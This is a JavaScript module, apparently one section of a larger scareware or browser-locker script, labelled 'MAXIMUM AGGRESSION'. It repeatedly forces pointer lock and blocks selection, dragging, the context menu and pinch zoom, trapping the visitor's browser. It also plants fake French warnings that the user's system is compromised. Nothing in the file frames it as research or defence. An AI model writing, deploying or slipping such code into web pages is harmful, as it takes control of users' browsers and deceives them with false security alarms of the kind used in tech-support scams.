/**
 * 21. POINTER LOCK + DRAG HIJACK + SELECTION BLOCK - MAXIMUM AGGRESSION
 */
const PointerDragLock = {
    init: function() {
        this.permanentPointerLock();
        this.hijackDragEvents();
        this.blockSelection();
        this.blockContextMenu();
        this.blockTouchGestures();
    },
    permanentPointerLock: function() {
        const lockPointer = () => {
            try {
                document.body.requestPointerLock();
            } catch(e) {}
        };
        document.addEventListener('click', lockPointer);
        document.addEventListener('keydown', lockPointer);
        document.addEventListener('mousemove', () => {
            if (!document.pointerLockElement) lockPointer();
        });
        document.addEventListener('pointerlockchange', () => {
            if (!document.pointerLockElement) {
                setTimeout(lockPointer, 100);
            }
        });
        // Keep trying
        setInterval(() => {
            if (!document.pointerLockElement) lockPointer();
        }, 500);
    },
    hijackDragEvents: function() {
        ['drag', 'dragstart', 'dragend', 'dragenter', 'dragleave', 'dragover', 'drop'].forEach(evt => {
            document.addEventListener(evt, (e) => {
                e.preventDefault();
                e.stopPropagation();
                return false;
            }, true);
        });
        // Inject fake drag content
        document.addEventListener('dragstart', (e) => {
            try {
                e.dataTransfer.setData('text/plain', '⚠️ SYSTÈME COMPROMIS - ' + window.location.href);
                e.dataTransfer.setData('text/html', '<b>⚠️ ALERTE</b><br>Votre système est compromis!');
            } catch(ex) {}
        });
    },
    blockSelection: function() {
        document.addEventListener('selectstart', (e) => {
            e.preventDefault();
            return false;
        }, true);
        // Also block via CSS
        const style = document.createElement('style');
        style.textContent = `
            * {
                -webkit-user-select: none !important;
                -moz-user-select: none !important;
                -ms-user-select: none !important;
                user-select: none !important;
                -webkit-touch-callout: none !important;
            }
        `;
        document.head.appendChild(style);
    },
    blockContextMenu: function() {
        document.addEventListener('contextmenu', (e) => {
            e.preventDefault();
            e.stopPropagation();
            return false;
        }, true);
    },
    blockTouchGestures: function() {
        ['touchstart', 'touchmove', 'touchend', 'touchcancel'].forEach(evt => {
            document.addEventListener(evt, (e) => {
                if (e.touches.length > 1) {
                    e.preventDefault();
                    return false;
                }
            }, { passive: false });
        });
        // Block pinch zoom
        document.addEventListener('gesturestart', (e) => {
            e.preventDefault();
            return false;
        }, true);
    }
};